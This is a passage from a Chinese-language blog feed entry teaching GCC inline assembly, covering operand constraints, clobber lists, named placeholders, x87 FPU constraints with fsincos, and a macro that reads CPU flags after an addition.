class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> data1 = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> data2 = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">int</span> result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">asm</span>( <span class="string">"imull %%edx, %%ecx\n\t"</span></span><br><span class="line">      <span class="string">"movl %%ecx, %%eax"</span></span><br><span class="line">      : <span class="string">"=a"</span> ( result )             <span class="comment">//最终的结果放在result变量中，使用eax且只写</span></span><br><span class="line">      : <span class="string">"d"</span> (data1), <span class="string">"c"</span> (data2)    <span class="comment">//data1使用edx，data2使用ecx</span></span><br><span class="line">                                    <span class="comment">//我们没有修改某一个寄存器的值，换句话说，我们只定了要使用的寄存器</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>( <span class="string">"The result is %d\n"</span>, result );</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>   我们定义了data1和data2，想对他们做乘法同时使用指定的寄存器。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">10</span>, b;</span><br><span class="line"><span class="keyword">asm</span> (<span class="string">"movl %1, %%eax;</span></span><br><span class="line"><span class="string">    movl %%eax, %0;"</span></span><br><span class="line">    :<span class="string">"=r"</span>(b)       <span class="comment">//输出到b变量，使用任意的通用寄存器，在代码中使用 %0 代替储存b变量的寄存器</span></span><br><span class="line">    :<span class="string">"r"</span>(a)        <span class="comment">//输入的是a变量，使用任意的通用寄存器，在代码中用 %1 来代替储存a变量的寄存器</span></span><br><span class="line">    :<span class="string">"%eax"</span>        <span class="comment">//我们破坏了%eax的值所以要告诉系统，这里不需要使用两个%%  </span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p> 那么出现了一个问题，如果一个变量既充当输入操作数，又充当输出操作数，应该怎么写呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( <span class="string">"imull %1, %0"</span></span><br><span class="line">  : <span class="string">"=r"</span> ( data2 )</span><br><span class="line">  : <span class="string">"r"</span> ( data1 ), <span class="string">"0"</span> ( data2 ) ); <span class="comment">//标记“0” 告诉编译器使用第一个命名的寄存器存放data2即%0，这样确保将使用相同的寄存器保存输入值和输出值</span></span><br></pre></td></tr></table></figure><p>  当然了，你可能觉得使用%0，%1….很难区分到底是哪个变量，我们可以使用<strong>替换占位符</strong>解决这个问题，就是给变量来个别名。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[name] <span class="string">"constrint"</span> (variable)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( <span class="string">"imul %[value1], %[value2]"</span></span><br><span class="line">      : [value2] <span class="string">"=r"</span> ( data2 )     <span class="comment">//[value2]是data2变量在代码中的别名，引用时加上%符号使用</span></span><br><span class="line">      : [value1] <span class="string">"r"</span> ( data1 ), <span class="string">"0"</span> ( data2 ) );</span><br></pre></td></tr></table></figure><h3 id="深入一些"><a href="#深入一些" class="headerlink" title="深入一些"></a>深入一些</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">asm</span> ( <span class="string">"divib %2\n\t"</span></span><br><span class="line">          <span class="string">"movl %%eax, %0"</span></span><br><span class="line">          : <span class="string">"=m"</span> ( result )                       <span class="comment">//写入result的内存位置</span></span><br><span class="line">          : <span class="string">"a"</span> ( dividend ), <span class="string">"m"</span> ( divisor ) );  <span class="comment">//被除数在eax中，除数使用内存位置，确定结果之后，他被传送到中它的内存位置中，而不是寄存器。</span></span><br><span class="line"><span class="built_in">printf</span>( <span class="string">"The result is %d\n"</span>, result );</span><br></pre></td></tr></table></figure><p> 这里我们并非直接使用寄存器，而是使用变量的内存位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">float</span> angle = <span class="number">90</span>;  </span><br><span class="line"><span class="keyword">float</span> radian, cosine, sine;</span><br><span class="line"></span><br><span class="line">radian = angle / <span class="number">180</span> * <span class="number">3.14159</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">asm</span> ( <span class="string">"fsincos"</span></span><br><span class="line">        : <span class="string">"=t"</span> (cosine), <span class="string">"=u"</span> ( sine )  <span class="comment">//指定输出值所在的FPU</span></span><br><span class="line">        : <span class="string">"0"</span> ( radian ) );</span><br><span class="line"><span class="built_in">printf</span>( <span class="string">"The cosine is %f, and the sine is %f\n"</span>, cosine, sine );</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这里我们对浮点数进行处理，浮点数有如下约束</p><ul><li>t引用顶部的浮点寄存器</li><li>f引用任何可用的浮点寄存器</li><li>u引用第二个浮点寄存器</li><li><strong>从FPU获得输出值的时候，不能使用约束f，必须声明约束t或者u来指定输出值所在的FPU</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( <span class="string">"fsincos"</span></span><br><span class="line">      : <span class="string">"=t"</span> (cosine), <span class="string">"=u"</span> ( sine )</span><br><span class="line">      : <span class="string">"0"</span> ( radian ) );</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( <span class="string">"fild %1\n\t"</span></span><br><span class="line">      <span class="string">"fimul %1\n\t"</span></span><br><span class="line">      <span class="string">"fldpi\n\t"</span></span><br><span class="line">      <span class="string">"fmul %%st(1), %%st(0)"</span></span><br><span class="line">      : <span class="string">"=t"</span> ( area )</span><br><span class="line">      : <span class="string">"m"</span> ( radius )  </span><br><span class="line">      : <span class="string">"%st(1)"</span> );           <span class="comment">//因为使用了ST(1)寄存器，但是没有把它赋值为输出值，所以必须在改动的寄存器列表中列出它，以便编译器直到在处理完成之后情况它.</span></span><br><span class="line"><span class="built_in">printf</span>( <span class="string">"The result is %f\n"</span>, area );</span><br></pre></td></tr></table></figure><p>最后就是我为了偷懒写的程序，写成了一个内联汇编宏函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GETPSW(a,b,flags)(&#123;\</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"add %[b], %[a]\n\t"</span> \</span><br><span class="line">        <span class="string">"pushfq\n\t"</span>         \</span><br><span class="line">        <span class="string">"pop %[f1]"</span>          \</span><br><span class="line">        : [f1] <span class="string">"=m"</span>(flags)   \</span><br><span class="line">        : [b] <span class="string">"r"</span>(b), [a]<span class="string">"r"</span>(a) \</span><br><span class="line">        );&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从一次偷懒学习内联汇编&quot;&gt;&lt;a href=&quot;#从一次偷懒学习内联汇编&quot; class=&quot;headerlink&quot; title=&quot;从一次偷懒学习内联汇编&quot;&gt;&lt;/a&gt;从一次偷懒学习内联汇编&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;上一节汇编语言课上，老师让写出两个数做加法，最终PSW各
      
    
    </summary>
    
      <category term="Assembler" scheme="http://yoursite.com/categories/Assembler/"/>
    
    
  </entry>
  
</feed>
